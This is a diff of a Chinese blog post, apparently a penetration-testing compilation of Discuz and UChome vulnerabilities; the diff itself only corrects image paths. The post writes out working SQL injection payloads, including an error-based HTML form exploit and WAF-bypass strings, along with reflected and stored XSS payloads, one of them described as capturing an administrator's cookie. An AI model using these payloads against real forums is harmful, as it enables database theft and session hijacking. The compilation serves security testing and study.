@@ -148,60 +148,60 @@
 <p>测试步骤与截图：</p>
 <p>各漏洞演示如下，共有19个功能或插件存在sql注入，但最后4个sql注入漏洞只找到POC，暂时无法演示。</p>
 <h3 id="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"><a href="#演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞" class="headerlink" title="演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞"></a>演示1：Discuz问卷调查专业版插件参数orderby存在SQL注入漏洞</h3><p>找到问卷调查专业版插件所在链接：<a target="_blank" rel="noopener" href="http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline">http://xxxxx/plugin.php?id=nds_up_ques:nds_ques_viewanswer&amp;srchtxt=1&amp;orderby=dateline</a>(问题出在orderby参数)，对该参数进行sql注入</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ec93ccdee00378ab38b1316ace94c44b.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ec93ccdee00378ab38b1316ace94c44b.png" class>
 
 <p>接下来就是使用sqlmap进行暴库了。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://www.5kik.com/php0day/239.html">http://www.5kik.com/php0day/239.html</a></p>
 <h3 id="演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）"><a href="#演示2：Discuz-x3-2前台GET型SQL注入漏洞（绕过全局WAF）" class="headerlink" title="演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）"></a>演示2：Discuz x3.2前台GET型SQL注入漏洞（绕过全局WAF）</h3><p>找到注入点：<a target="_blank" rel="noopener" href="http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types%5B1%5D=x">http://localhost/bbs/misc.php?mod=stat&op=trend&xml=1&merge=1&types[1]&#x3D;x</a></p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946b2c1d8e99431b39ca31aa6d56b11d.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946b2c1d8e99431b39ca31aa6d56b11d.png" class>
 
 <p>也就是说我们可以控制的部分有很多。<br>且不看全局防注入源码，黑盒试一下我发现一旦出现’、(就会拦截，而且注释符（#、–）也会拦截。<br>括号不能有，就特别拙计，因为很多盲注需要括号，子查询也需要括号，函数也需要括号，这里都不能用了。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/85936efd8e72984ff6c94729f00cf1a3.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/85936efd8e72984ff6c94729f00cf1a3.png" class>
 
 <p>我们再看上述sql语句，发现我们可控的部分前面，还有个daytime。这就愁坏我了，因为我要查询的表是用户表，而用户表根本没这个字段。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a01c46097785d64627eac5950a435d50.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/a01c46097785d64627eac5950a435d50.png" class>
 
 <p>执行会提示Unknown column ‘daytime’ in ‘field list’。<br>所以，我们可以利用mysql的特性，一次查询两个表，将pre_ucenter_members的数据连带着查询出来：</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b1530110687ade97e4c2ee5244cf1782.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b1530110687ade97e4c2ee5244cf1782.png" class>
 
-<p>大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。<br>那么，有的同学再问，sql语句后半部分<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/cbe2ae3ffe3c952fc9bec375b642557b.png" class></p>
+<p>大家可以看到，已经不报错了。因为pre_common_statuser表中存在`daytime`这个列。而且这个表中也有uid这个列，正好可以作为pre_ucenter_members的筛选项。<br>那么，有的同学再问，sql语句后半部分<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/cbe2ae3ffe3c952fc9bec375b642557b.png" class></p>
 <p>没有注释符怎么处理？<br>这里有个巧合，在某些情况下，`能作为注释符用。因为mysql会自动给sql语句结尾没有闭合的`闭合掉，这样，只要让mysql人为后面那一大串字符是一个字段的“别名”即可。<br>所以，先构造一个url：</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3203a48961dfad2e03dbd9c55ee76626.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3203a48961dfad2e03dbd9c55ee76626.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/50cf97eebf609ecdeda0134d1a96fe3a.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/50cf97eebf609ecdeda0134d1a96fe3a.png" class>
 
 <p>可以看到已经出数据了。但发现出来的数据只有4位。<br>原因是，在源码中使用了substr取了daytime的第4到8位。修改POC</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/618e4f8322f62c03c515a8d32169f169.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/618e4f8322f62c03c515a8d32169f169.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/26869.html">https://www.secpulse.com/archives/26869.html</a></p>
 <h3 id="演示3：discuz-ychat插件注入漏洞"><a href="#演示3：discuz-ychat插件注入漏洞" class="headerlink" title="演示3：discuz ychat插件注入漏洞"></a>演示3：discuz ychat插件注入漏洞</h3><p><a target="_blank" rel="noopener" href="http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x">http://www.51jqa.com/plugin.php?id=ychat&amp;mod=rooms&amp;cid=6x</a></p>
 <p>cid参数存在SQL注入</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=108978">https://bugs.shuimugan.com/bug/view?bug_no=108978</a></p>
 <h3 id="演示4：Discuz-Plugin-JiangHu-1-1-x2F-forummission-php-SQL注入漏洞"><a href="#演示4：Discuz-Plugin-JiangHu-1-1-x2F-forummission-php-SQL注入漏洞" class="headerlink" title="演示4：Discuz Plugin JiangHu 1.1 &#x2F;forummission.php SQL注入漏洞"></a>演示4：Discuz Plugin JiangHu 1.1 &#x2F;forummission.php SQL注入漏洞</h3><p>forummission.php？index&#x3D;show$id&#x3D;24中的id参数存在sql注入漏洞</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8737db6a75addd1839b67cde1f094956.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8737db6a75addd1839b67cde1f094956.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="http://www.gltc.cn/30161.html">http://www.gltc.cn/30161.html</a></p>
 <h3 id="演示5：Discuz-6-0-x2F-my-php-SQL注入漏洞"><a href="#演示5：Discuz-6-0-x2F-my-php-SQL注入漏洞" class="headerlink" title="演示5：Discuz 6.0 &#x2F;my.php SQL注入漏洞"></a>演示5：Discuz 6.0 &#x2F;my.php SQL注入漏洞</h3><p>把以下EXP保存成HTML文档</p>
 <p>&lt;form method&#x3D;’post’ action&#x3D;’<a target="_blank" rel="noopener" href="http://dz6.0/my.php?item=buddylist&#39;\&gt;">http://dz6.0/my.php?item=buddylist&#39;\&gt;</a> &lt;input<br>type&#x3D;’hidden’ value&#x3D;”1111” name&#x3D;”descriptionnew[1’ and(select 1 from(select<br>count(*),concat((select (select (select<br>concat(0x7e,user(),0x7e,0x5430304C5320474F21,0x7e) limit 0,1)) from<br>information_schema.tables limit 0,1),floor(rand(0)*2))x from<br>information_schema.tables group by x)a) and 1&#x3D;1#]” &#x2F;&gt;&lt;br &#x2F;&gt; &lt;input<br>type&#x3D;’submit’ value&#x3D;’buddysubmit’ name&#x3D;’buddysubmit’ &#x2F;&gt;&lt;br &#x2F;&gt; &lt;&#x2F;form&gt;</p>
 <p>使用浏览器打开</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ea45b4207fca0e5fb1d8a950810dca79.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ea45b4207fca0e5fb1d8a950810dca79.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=80359">https://bugs.shuimugan.com/bug/view?bug_no=80359</a></p>
 <h3 id="演示6：UChome-注入漏洞1"><a href="#演示6：UChome-注入漏洞1" class="headerlink" title="演示6：UChome 注入漏洞1"></a>演示6：UChome 注入漏洞1</h3><p>首先注册用户 然后新建一个相册<br><a target="_blank" rel="noopener" href="http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me">http://127.0.0.1/uchome/space.php?uid=2&amp;do=album&amp;view=me</a> 打开这里点上传<br>新建完了之后 上传一个图片 完了之后 点进相册 然后在点刚刚上传的图片 点击管理图片<br>直接确认 然后抓包 把titie的那个改成 title%5B1’ and (select 1 from (select<br>count(),concat(version(),floor(rand(0)2))x from information_schema.tables group<br>by x)a)#%5D 原始内容可能是title%5B1%5D 修改成上面的 就可以看到错误信息了</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b253b877f2608abb78cf36512ad2179e.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b253b877f2608abb78cf36512ad2179e.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93618">https://www.seebug.org/vuldb/ssvid-93618</a></p>
 <h3 id="演示7：UChome-注入漏洞2"><a href="#演示7：UChome-注入漏洞2" class="headerlink" title="演示7：UChome 注入漏洞2"></a>演示7：UChome 注入漏洞2</h3><p>注册用户后登陆 然后点击日志 创建新日志 然后打开BURP进行抓包<br>找一个没有用的POST选项 改成picids[‘] 然后在提交 就可以看到结果了</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/295ac8423cf91b32c8f202dcbf79d357.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/295ac8423cf91b32c8f202dcbf79d357.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/199e997d938cc2d2e3f8ffc1d061c07d.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/199e997d938cc2d2e3f8ffc1d061c07d.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93616">https://www.seebug.org/vuldb/ssvid-93616</a></p>
 <h3 id="演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞"><a href="#演示8：Discuz-X2-5-521交友插件-jiaoyou-php-SQL注入漏洞" class="headerlink" title="演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞"></a>演示8：Discuz! X2.5 521交友插件 jiaoyou.php SQL注入漏洞</h3><p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?pid=1">http://ip/jiaoyou.php?pid=1</a></p>
 <p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?mod=search&amp;residecity">http://ip/jiaoyou.php?mod=search&amp;residecity</a>&#x3D;</p>
 <p><a target="_blank" rel="noopener" href="http://ip/jiaoyou.php?mod=search&amp;resideprovince">http://ip/jiaoyou.php?mod=search&amp;resideprovince</a>&#x3D;</p>
 <p>pid、residecity、resideprovince参数均存在SQL注入</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/dd22c1792c7d1a99a4a3b8589a9d8286.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/dd22c1792c7d1a99a4a3b8589a9d8286.png" class>
 
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.unhonker.com/bug/1058.html">https://www.unhonker.com/bug/1058.html</a></p>
@@ -210,7 +210,7 @@
 <h3 id="演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞"><a href="#演示9：Discuz-X2-V63积分商城插件-SQL注入漏洞" class="headerlink" title="演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞"></a>演示9：Discuz! X2 V63积分商城插件 SQL注入漏洞</h3><p>在discuz<br>v63积分商城插件注入漏洞exp中并不需要斜杠、#号和—注释符。所以会执行$clean &#x3D;<br>preg_replace(“&#x2F;’(.+?)’&#x2F;s”, ”,<br>$sql);原来SQL语句中两个单引号中间的内容就会被替换为空。并不会进入到下面的else分支。Else下面的所有操作均是对$clean变量的操作。所以绕过的思路就是把SQL语句放在两个单引号中间。对于mysql的一个特性，<br>@`’`<br>是为空的，所以我们的攻击语句可以放到两个@`’`中间，即使GPC开启，单引号被转义为\’，而@`’`变成@`\’`对注入也是没有影响的，所以此绕过方法无限制。</p>
 <p>即针对该注入漏洞的攻击EXP为：</p>
 <p><a target="_blank" rel="noopener" href="http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110">http://www.cnseay.com/discuz/plugin.php?id=v63shop:goods&amp;pac=info&amp;gid=110</a> or<br>@`’` and (select * from (select count(*),concat(floor(rand(0)*2),(select<br>user()))a from information_schema.tables group by a)b) or @`’` or @`’` and<br>(select * from (select count(*),concat(floor(rand(0)*2),(select user()))a<br>from information_schema.tables group by a)b) or @`’`</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/df2d41ccd913943f04b53d832c737ae0.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/df2d41ccd913943f04b53d832c737ae0.png" class>
 
 <p>可以看到我们的注入语句被替换掉了，所以后面的检查字符的时候并没有发现注入语句。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://netsecurity.51cto.com/art/201303/386717.htm">http://netsecurity.51cto.com/art/201303/386717.htm</a></p>
@@ -219,7 +219,7 @@
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.webshell.cc/562.html">https://www.webshell.cc/562.html</a></p>
 <h3 id="演示11：Discuz-X2-forum-attachment-php-sql注入漏洞"><a href="#演示11：Discuz-X2-forum-attachment-php-sql注入漏洞" class="headerlink" title="演示11：Discuz! X2 forum_attachment.php sql注入漏洞"></a>演示11：Discuz! X2 forum_attachment.php sql注入漏洞</h3><p><a target="_blank" rel="noopener" href="http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid">http://www.discuz.net/forum.php?mod=attachment&amp;findpost=ss&amp;aid</a>&#x3D;</p>
 <p>链接中，aid参数存在SQL注入，但需要把SQL语句进行base64编码，如</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b018839dadf33e4620e75cef37ac7a90.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b018839dadf33e4620e75cef37ac7a90.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/devi1o/articles/4874822.html">https://www.cnblogs.com/devi1o/articles/4874822.html</a></p>
 <h3 id="演示12：Discuz！7-2-x2F-X1-第三方插件SQL注入及持久型XSS漏洞"><a href="#演示12：Discuz！7-2-x2F-X1-第三方插件SQL注入及持久型XSS漏洞" class="headerlink" title="演示12：Discuz！7.2&#x2F;X1 第三方插件SQL注入及持久型XSS漏洞"></a>演示12：Discuz！7.2&#x2F;X1 第三方插件SQL注入及持久型XSS漏洞</h3><p><a target="_blank" rel="noopener" href="http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2">http://xxxxxxxx/plugin.php?id=moodwall&amp;action=edit_mood&amp;moodid=2</a></p>
@@ -234,11 +234,11 @@
 <p>id参数存在SQL注入。</p>
 <p>参考链接：<a target="_blank" rel="noopener" href="http://www.hack6.com/wzle/gf/20140208/39554.html">http://www.hack6.com/wzle/gf/20140208/39554.html</a></p>
 <h3 id="演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit"><a href="#演示15：Discuz-7-x-csrf-存储xss-富文本-脱裤-2处-和后台sql-root-getshell-附带exploit" class="headerlink" title="演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)"></a>演示15：Discuz! 7.x csrf+存储xss(富文本)脱裤(2处)和后台sql(root getshell)(附带exploit)</h3><p>在管理后台-工具-数据-调用-自定义模块存在SQL注入，详情看图即可明白</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/88a65fe6d045049abf00a12f417fc72f.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/88a65fe6d045049abf00a12f417fc72f.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4b91c80f9526cd448e60a904e4e32d41.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4b91c80f9526cd448e60a904e4e32d41.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b5a668d79a3a0b596c54ea1009cb4479.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b5a668d79a3a0b596c54ea1009cb4479.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93737">https://www.seebug.org/vuldb/ssvid-93737</a></p>
 <h3 id="漏洞POC："><a href="#漏洞POC：" class="headerlink" title="漏洞POC："></a>漏洞POC：</h3><p>Discuz! 4.x SQL injection POC</p>
@@ -267,15 +267,15 @@
 <p>参考链接：<a target="_blank" rel="noopener" href="http://www.bubuko.com/infodetail-2094064.html">http://www.bubuko.com/infodetail-2094064.html</a></p>
 <h3 id="演示2：Discuz-7-2-反射型xss漏洞2"><a href="#演示2：Discuz-7-2-反射型xss漏洞2" class="headerlink" title="演示2：Discuz 7.2 反射型xss漏洞2"></a>演示2：Discuz 7.2 反射型xss漏洞2</h3><p>访问如下链接即可触发</p>
 <p><a target="_blank" rel="noopener" href="http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert(document.domain)-">http://ip/logging.php?action=logout&amp;formhash=b1abb3e2&amp;referer=%27-alert%28document.domain%29-</a></p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d57b73372148026c6028251ddc12ef7c.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d57b73372148026c6028251ddc12ef7c.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-89252">https://www.seebug.org/vuldb/ssvid-89252</a></p>
 <h3 id="演示3：Disucz-X3-2-多处反射型XSS漏洞"><a href="#演示3：Disucz-X3-2-多处反射型XSS漏洞" class="headerlink" title="演示3：Disucz X3.2 多处反射型XSS漏洞"></a>演示3：Disucz X3.2 多处反射型XSS漏洞</h3><p><a target="_blank" rel="noopener" href="http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/">http://ip/member.php?mod=logging&amp;action=login&amp;referer=javascript://www.discuz.net/</a></p>
 <p><a target="_blank" rel="noopener" href="http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/">http://ip/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=javascript://www.discuz.net/</a></p>
 <p>以上链接的referer参数存在XSS漏洞，访问如上链接可查看HTML</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b9188996d2c703cc4eef76d4c40540dc.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b9188996d2c703cc4eef76d4c40540dc.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9477cbf714cb2776e884a98262745922.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9477cbf714cb2776e884a98262745922.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93719">https://www.seebug.org/vuldb/ssvid-93719</a></p>
 <h2 id="存储型XSS漏洞"><a href="#存储型XSS漏洞" class="headerlink" title="存储型XSS漏洞"></a>存储型XSS漏洞</h2><p><strong>漏洞描述：</strong>攻击者可指定任意用户的会话session等会话校验字符串。攻击者可以轻松指定任意用户的session，待诱导用户登录之后，直接使用此session登录用户账号。多常见于此类字段存在于url登录地址中的情况。涉及URL如下：</p>
@@ -295,103 +295,103 @@
 <p>测试步骤与截图：</p>
 <p>各漏洞演示如下，共有13个功能或插件存在反射型XSS</p>
 <h3 id="演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）"><a href="#演示1：Discuz-3-0-3-2版本的通杀xss存储漏洞（需开始直播功能）" class="headerlink" title="演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）"></a>演示1：Discuz!3.0-3.2版本的通杀xss存储漏洞（需开始直播功能）</h3><p>discuz3.0-3.2有个功能叫直播的。实习版主就能开启哈~<br>接着咱们就用admin帐号先把一个帖子弄成直播！</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/58408e5396ca116e16614a9b1601e894.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/58408e5396ca116e16614a9b1601e894.png" class>
 
 <p>先把payload进行base16编码（如果不拦截，直接上原始payload）</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/281d7fb89a658cff5a42b07217026d24.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/281d7fb89a658cff5a42b07217026d24.png" class>
 
 <p>在直播发帖处进行发表</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5cc92bcad46824d7e41f06de5116aeb4.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5cc92bcad46824d7e41f06de5116aeb4.png" class>
 
 <p>弹窗~</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1f16610a47e54f4cc664d28a18009681.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1f16610a47e54f4cc664d28a18009681.png" class>
 
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/33389.html">https://www.secpulse.com/archives/33389.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93716">https://www.seebug.org/vuldb/ssvid-93716</a></p>
 <h3 id="演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过："><a href="#演示2：全版本存储型（4-0版本之前，建议测试全版本）XSS及其绕过：" class="headerlink" title="演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过："></a>演示2：全版本存储型（4.0版本之前，建议测试全版本）XSS及其绕过：</h3><p>此处演示绕过：在发帖或回复处添加“[email]2”onmouseover&#x3D;”alert(2)[&#x2F;email]”</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/2192718863ecc37e99869241f451f578.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/2192718863ecc37e99869241f451f578.png" class>
 
 <p>然后对帖子或者评论进行编辑时，与页面进行一定交互时即可触发 XSS：</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/933da97c673d2b6b86e5a9beb7a82ebf.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/933da97c673d2b6b86e5a9beb7a82ebf.png" class>
 
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ac627b1480f42a10d09faa7840daa07c.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/ac627b1480f42a10d09faa7840daa07c.png" class>
 
 <p>参考链接：</p>
 <p><a target="_blank" rel="noopener" href="http://0day5.com/archives/3323/">http://0day5.com/archives/3323/</a></p>
 <p>20150609补丁绕过：<a target="_blank" rel="noopener" href="http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/">http://blog.knownsec.com/2015/12/discuz-20150609-xss-bug-fixes-bypass-report/</a></p>
 <p><a target="_blank" rel="noopener" href="https://bugs.shuimugan.com/bug/view?bug_no=139851">https://bugs.shuimugan.com/bug/view?bug_no=139851</a></p>
 <h3 id="演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞"><a href="#演示3：Discuz-链接格子插件-v2-5-1-存储型-XSS-漏洞" class="headerlink" title="演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞"></a>演示3：Discuz! 链接格子插件 v2.5.1 存储型 XSS 漏洞</h3><p>在论坛自助购买广告位处，在“文字内容中”填写”&gt;&lt;img&#x2F;src&#x3D;1&#x2F;&gt;</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0a1d28d7afb2ed43aef928c51971b5b6.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0a1d28d7afb2ed43aef928c51971b5b6.png" class>
 
 <p>在管理后台-应用-自助广告位可发现弹出窗口</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9272dfb415c08bb154c70dad8f506bb3.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9272dfb415c08bb154c70dad8f506bb3.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-90006">https://www.seebug.org/vuldb/ssvid-90006</a></p>
 <h3 id="演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员"><a href="#演示4：Discuz-x2-x2-5-x3-0-x3-1-x3-2-XSS直打管理员" class="headerlink" title="演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员"></a>演示4：Discuz! x2,x2.5,x3.0,x3.1,x3.2 XSS直打管理员</h3><p>在添加链接处，如添加友链或发帖内容填写友链处。</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/841d5c2797f52d13ec241c760a420b06.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/841d5c2797f52d13ec241c760a420b06.png" class>
 
 <p>添加xss代码</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/674987aa9589354b68b27a937e94b9e3.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/674987aa9589354b68b27a937e94b9e3.png" class>
 
 <p>等管理员审核的时候获取到cookie</p>
-<img src="/.com//10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/284a885c94357c2a6a88414d3296b872.png" class>
+<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/284a885c94357c2a6a88414d3296b872.png" class>
 
 <p>参考链接：<a target="_blank" rel="noopener" href="https://www.seebug.org/vuldb/ssvid-93713">https://www.seebug.org/vuldb/ssvid-93713</a></p>
